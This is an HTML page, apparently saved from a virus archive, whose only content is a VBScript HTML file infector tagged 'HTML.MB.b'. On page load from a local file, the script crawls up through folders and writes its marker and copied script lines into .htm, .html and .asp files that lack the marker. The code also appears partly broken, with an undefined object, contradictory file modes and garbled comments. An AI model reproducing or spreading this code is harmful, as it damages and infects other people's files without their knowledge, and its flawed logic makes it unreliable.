<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0054)http://vx.netlux.org/bin/script/VBS.Jertva/VBS.Jertva? -->
<!-- HTML.MB.b --><HTML><HEAD>
<META content="text/html; charset=gb2312" http-equiv=Content-Type>
<SCRIPT language=VBScript>
<!--
On Error Resume Next
If location.protocol = "file:" Then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Path = Replace(location.href, "/", "\")
   Path = Replace(Path, "file:\\\", "")
   NP = FSO.GetParentFolderName(Path)
   Set Folder = FSO.GetFolder(NP)
   Call ScanDir(Folder)
End If

Sub ScanDir(Dir)
While Dir.IsRootFolder = false
   Set Dir = FileSystem.GetFolder(NP)
   Set DF = Dir.Files
   Path = FSO.GetParentFolderName(NP)

For each Jertva in DF
    ext = Lcase(FSO.GetExtensionName(Jertva.name))
    If ext = "htm" or ext = "html" or ext ="asp" Then
    Set host = FSO.opentextfile(Jertva.path, 2, true)

    Stop = 0
    Do While host.AtEndOfStream <> True
        GetMark = host.ReadLine
        If GetMark = "<!-- HTML.MB.b -->" Then
            Stop = 1
        End If
    Loop

    If Stop = 0 Then
        '酄ガ !
        '?錉┇?ⅷ嚆幞 岑汜獱ガ犸 ぎ 猹?
        Set CV = FSO.opentextfile(Path, 1, true)
        Do While Stop = 0
            GetMark = CV.ReadLine
            if GetMark = "<!-- HTML.MB.b -->" Then
               Stop = 1
            End If
        Loop
        '啷犭ガ ⑨?ぎ ?錉┇?ⅷ嚆釥 ??錉┇?Ε噔㈦
        host.WriteLine "<!-- HTML.MB.b -->"
        Do While host.AtEndOfStream <> True
           host.WriteLine CV.ReadLine
        Loop
        host.Close
        CV.close
    Else
        host.Close
    End If
Next
Wend
End Sub
--></SCRIPT>

<META content="MSHTML 5.00.2614.3500" name=GENERATOR></HEAD>
<BODY></BODY></HTML>
